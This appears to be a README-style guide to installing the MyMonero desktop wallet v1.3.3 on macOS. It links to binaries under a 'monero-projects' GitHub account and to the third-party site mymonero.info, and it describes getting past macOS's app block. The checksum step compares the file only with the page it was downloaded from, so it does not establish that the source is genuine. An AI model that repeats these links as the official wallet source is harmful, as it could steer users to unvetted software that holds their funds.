<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">Install MyMonero on macOS</h1>
<p align="center">Download the final desktop release from GitHub, verify its SHA-256 value, and open it safely.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
MyMonero desktop's final release is v1.3.3, with a macOS .dmg on the official GitHub release page. Download that file from the project, compare its SHA-256 value with the published value, then use macOS's right-click > Open option if the system blocks the app.


For a second walkthrough, see [MyMonero app not opening on mymonero.info](https://mymonero.info/mymonero-app-not-opening). The site also keeps a [MyMonero download page](https://mymonero.info/github/monero-projects) and an overview of [MyMonero safety facts](https://mymonero.info/is-mymonero-safe).

## You'll see this if
- You want to install MyMonero desktop on a Mac.
- macOS says the downloaded app cannot be opened.
- You need to confirm a .dmg is from the genuine project release.
- You are choosing between the old desktop wallet and restoring elsewhere.

## Why it happens
MyMonero desktop is no longer an actively maintained application. Its final release, v1.3.3, is published for macOS as a .dmg, with Windows .exe and Linux .zip packages also listed. The old app still opens wallets and sends XMR, but it has no new features or security updates. MyMonero hosted servers and web wallet login stopped.

macOS may block an app downloaded from the internet until you explicitly approve opening it. That does not replace checking the file's origin or integrity. Compare the file's SHA-256 hash with the value on the release page before opening. The macOS command is `shasum -a 256 <file>`; the result should match the published value for that exact asset.

Installing the app and restoring a wallet are separate. MyMonero seeds can be 13 words (MyMonero-specific, legacy) or 25 words (standard Monero). Cake Wallet is the only other wallet named here; it runs on iOS, Android, macOS, and Linux, while Windows desktop builds are paused at the time of writing. See [restore a MyMonero wallet](./restore-mymonero-wallet.md) and [migration options](./mymonero-to-cake-wallet-migration.md).

---
## Fix
1. **Open the official release information.** Go directly to the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3). Confirm the project is monero-projects and select the macOS .dmg asset. Avoid search-ad downloads, unofficial mirrors, and links in unsolicited messages.
2. **Download the expected package.** Save the .dmg in a location you can identify. A familiar-looking filename is not proof of authenticity. Do not open attachments that claim to be an update or recovery tool.
3. **Verify SHA-256 before opening.** In Terminal, run `shasum -a 256 <file>`, replacing `<file>` with the actual path to the downloaded .dmg. Compare the complete SHA-256 result with the value listed on the GitHub release page for the same asset. Do not use a checksum copied from another source.
4. **Stop on a mismatch.** If the values differ, do not open or install that file. Remove it, download a fresh copy from the official release page, and compare again. A matching hash confirms the file matches the published value; it does not mean the old app is maintained.
5. **Open the disk image and install.** Once the hash matches, open the .dmg and follow the package's instructions to place the app as directed. Read system prompts rather than automatically overriding them.
6. **Use the macOS block workaround only for the verified app.** If macOS says the app cannot be opened because it is from an unidentified developer or downloaded from the internet, locate the app in Finder, right-click it, and choose **Open**. Confirm the prompt only after you have verified the download and are comfortable proceeding. Do not use this step to bypass concerns about a file with an unknown origin or hash mismatch.
7. **Launch the wallet.** Open MyMonero from the location where you installed it. If you already have a wallet, choose the appropriate open or restore path. Never enter seed words into a browser, installer, or support message.
8. **Restore carefully when needed.** A 13-word seed is MyMonero-specific and legacy; a 25-word seed is standard Monero. Use a compatible recovery method and inspect your private backup locally. For more guidance, see [13-word seed restore](./mymonero-13-word-seed-restore.md) and [25-word seed migration](./mymonero-25-word-seed-migration.md).
9. **Allow scanning to finish.** The wallet may need to scan history after restoration. Restore height is the block height at which scanning starts; earlier is safer if uncertain, but takes longer. Read MyMonero restore height explained.

> [!WARNING]
> Never share a seed to install, open, or verify the application. Nobody legitimate needs your recovery words, and a request to enter them on a web page is a reason to stop.

---
## If that did not work
If the SHA-256 value differs, do not launch the app. Make sure the command used the actual downloaded file and that you compared it with the value for the macOS asset, not another package. The MyMonero desktop repository provides project release information.

If macOS still blocks the verified application, confirm you are using Finder's right-click > Open on the app itself, and review the system prompt before proceeding. Do not disable protections broadly or use an unverified download. The desktop app is no longer maintained, so consider whether continuing with it is appropriate for you.

If the app opens but your balance or activity is missing, this is a wallet restoration or scan question, not an installation issue by itself. Check that the seed format is supported, the intended wallet was restored, and the restore height includes the activity period. Consult MyMonero balance shows zero and transaction not showing. Keep your seed private at all times.

## Prevention
- Get the .dmg only from the project’s official GitHub release page.
- Check the release version, macOS asset, and SHA-256 value before opening.
- Use right-click > Open only with the verified app when macOS blocks it.
- Keep the seed offline and separate from downloaded application files.
- Remember that v1.3.3 is the final release and is not maintained with new security updates.
- Avoid replacement MyMonero web login pages and unsolicited recovery help.

## FAQ
<details><summary>Which MyMonero release should I install on macOS?</summary>

The final desktop release is v1.3.3, distributed for macOS as a .dmg on the project's GitHub release page.

</details>

<details><summary>How do I check the .dmg file?</summary>

Run `shasum -a 256 <file>` in Terminal and compare the output with the SHA-256 value for the same asset on the release page.

</details>

<details><summary>What does right-click > Open do?</summary>

It is the stated macOS workaround when the app is blocked. Use it only after checking the source and hash of the file, and review the confirmation prompt.

</details>

<details><summary>Is MyMonero desktop still maintained?</summary>

No. It still opens wallets and sends XMR, but is no longer maintained and has no new features or security updates. Hosted servers and web wallet login stopped.

</details>

---

## Download MyMonero

- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [Install MyMonero on Linux](./install-mymonero-linux.md) | Get the final Linux desktop release and open it with care. |
| [Verify a MyMonero Download with SHA-256](./verify-mymonero-download-sha256.md) | Compare the file you downloaded with the release page before opening it. |
| [How to Use MyMonero Desktop](./how-to-use-mymonero-desktop.md) | What the final desktop app can still do, and how to use it with care. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
